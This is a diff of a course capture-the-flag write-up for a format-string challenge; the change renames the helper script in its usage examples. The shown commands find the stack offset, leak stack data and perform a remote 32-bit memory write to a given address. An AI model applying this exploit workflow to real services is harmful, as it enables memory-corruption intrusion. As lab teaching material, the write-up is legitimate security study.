@@ -140,16 +140,16 @@ Use this for repeatability after you understand Method 1. The script automates:
 - Payload building
 
 Script file:
-- `exploit_fs3.py`
+- `exploit.py`
 
 ### Commands available
 
 | Command | What it does | Example |
 |---------|------------|---------|
-| `find-offset` | Auto-detect where your input lands on stack | `python3 exploit_fs3.py find-offset` |
-| `exploit` | Find offset + build + send full 32-bit write | `python3 exploit_fs3.py exploit --remote` |
-| `leak` | Simple proof-of-concept stack read | `python3 exploit_fs3.py leak` |
-| `write VALUE` | Simple 16-bit write (for learning) | `python3 exploit_fs3.py write 119` |
+| `find-offset` | Auto-detect where your input lands on stack | `python3 exploit.py find-offset` |
+| `exploit` | Find offset + build + send full 32-bit write | `python3 exploit.py exploit --remote` |
+| `leak` | Simple proof-of-concept stack read | `python3 exploit.py leak` |
+| `write VALUE` | Simple 16-bit write (for learning) | `python3 exploit.py write 119` |
 
 ### Step-by-step terminal workflow
 
@@ -157,11 +157,11 @@ Script file:
 cd /home/jbenjam7/cs466/ctf/formatstring3
 
 # Step 1: Find where your input lands on the stack
-python3 exploit_fs3.py find-offset
+python3 exploit.py find-offset
 # Output: [+] Input starts at stack argument %5$...
 
 # Step 2: Exploit with auto-detected offset
-python3 exploit_fs3.py exploit --remote
+python3 exploit.py exploit --remote
 # Output:
 #   [*] Using base offset: %5$
 #   [*] Target address: 0x080e6048
@@ -175,12 +175,12 @@ python3 exploit_fs3.py exploit --remote
 
 If the challenge is the same binary or a close variant, this is the fastest workflow:
 
-1. Run `python3 exploit_fs3.py find-offset` to confirm the stack index.
-2. Run `python3 exploit_fs3.py exploit --remote` to attempt the full write.
+1. Run `python3 exploit.py find-offset` to confirm the stack index.
+2. Run `python3 exploit.py exploit --remote` to attempt the full write.
 3. If the target address or value changes, pass them explicitly:
 
 ```bash
-python3 exploit_fs3.py exploit 0x80e6048 0xD0C0FFEE --remote
+python3 exploit.py exploit 0x80e6048 0xD0C0FFEE --remote
 ```
 
 If the exploit fails, fall back to the manual method above and rebuild the padding by hand.
@@ -189,10 +189,10 @@ If the exploit fails, fall back to the manual method above and rebuild the paddi
 
 ```bash
 # Use explicit target address and value
-python3 exploit_fs3.py exploit 0x12345678 0xAABBCCDD --remote
+python3 exploit.py exploit 0x12345678 0xAABBCCDD --remote
 
 # Local testing (no --remote flag)
-python3 exploit_fs3.py exploit 0x80e6048 0xD0C0FFEE
+python3 exploit.py exploit 0x80e6048 0xD0C0FFEE
 ```
 
 ### How the Python script differs from manual method
@@ -221,8 +221,8 @@ If the stack layout changes and offset moves from %5 to something else:
 - You'd have to redo all your math and edit the printf command
 
 **Python method:**
-- Just run: `python3 exploit_fs3.py find-offset`
-- Then: `python3 exploit_fs3.py exploit --remote`
+- Just run: `python3 exploit.py find-offset`
+- Then: `python3 exploit.py exploit --remote`
 - Script auto-detects new offset and adapts payload
 
 ### Why this helps
@@ -278,8 +278,8 @@ That is the full pattern. The exact numbers change, but the workflow does not.
 4. Then read **Method 2** to see how it automates everything
 
 ### For repeated exploitation:
-1. Use `python3 exploit_fs3.py find-offset` to verify current stack layout
-2. Use `python3 exploit_fs3.py exploit --remote` to exploit
+1. Use `python3 exploit.py find-offset` to verify current stack layout
+2. Use `python3 exploit.py exploit --remote` to exploit
 3. Done
 
 ### The core technique you learned:
